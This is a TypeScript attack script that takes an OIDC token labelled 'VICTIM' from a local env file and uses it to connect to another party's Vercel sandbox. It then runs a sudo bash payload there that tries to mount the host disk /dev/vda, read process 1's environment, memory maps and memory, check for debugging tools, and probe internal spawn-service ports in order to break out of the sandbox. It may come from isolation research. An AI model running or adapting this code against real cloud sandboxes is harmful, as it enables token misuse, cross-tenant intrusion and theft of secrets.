import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
echo "===== FULL mountinfo (254:0 = vda) ====="
grep "254:0" /proc/1/mountinfo 2>/dev/null
echo "===== try mount vda root elsewhere ====="
mkdir -p /mnt/vdaroot
sudo mount -t xfs -o ro,nouuid /dev/vda /mnt/vdaroot 2>&1
echo "exit: $?"
mount --bind /dev/vda /mnt/vdaroot 2>&1; echo "bind exit: $?"
echo "===== find cell paths in mountinfo ====="
grep -E "cell|volumes|/dev/root" /proc/1/mountinfo | head
echo "===== sandbox-init maps (pid 1) ====="
cat /proc/1/maps 2>&1 | head -20
echo "===== tools present? ====="
which gdb strace ltrace gcore dd xxd strings 2>&1
echo "===== ptrace test on pid 1 ====="
sudo python3 - <<'PY'
import subprocess, os, signal
try:
    r = subprocess.run(["cat", "/proc/1/environ"], capture_output=True, text=True, timeout=10)
    print("environ len:", len(r.stdout))
except Exception as e:
    print("ERR", e)
PY
echo "===== read /proc/1/mem via dd (root) ====="
sudo dd if=/proc/1/mem of=/tmp/pid1mem bs=1 count=0 2>&1 | head -3
echo "===== TCP ports with Connect headers ====="
python3 - <<'PY'
import socket, time
CRLF="\r\n"
def probe(port, path, ctype):
    s=socket.socket(); s.settimeout(4)
    try:
        s.connect(("127.0.0.1", port))
        body="{}"
        req="POST %s HTTP/1.1%sHost: localhost%sContent-Type: %s%sContent-Length: %d%s%s%s"%(path,CRLF,CRLF,ctype,CRLF,len(body),CRLF,CRLF,body)
        s.sendall(req.encode())
        data=b""
        while True:
            try: c=s.recv(4096)
            except socket.timeout: break
            if not c: break
            data+=c
        print("--- :%d %s [%s] ---"%(port,path,ctype)); print(data[:1200])
    except Exception as e:
        print("--- :%d %s [%s] ERR %s"%(port,path,ctype,e))
    finally:
        s.close()
for p in [23456,30001,30002]:
    probe(p, "/vercel.sandbox.spawn.v1.SpawnService/Ping", "application/connect+json")
    probe(p, "/grpc.health.v1.Health/Check", "application/connect+json")
print("PORT DONE")
PY
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 150_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });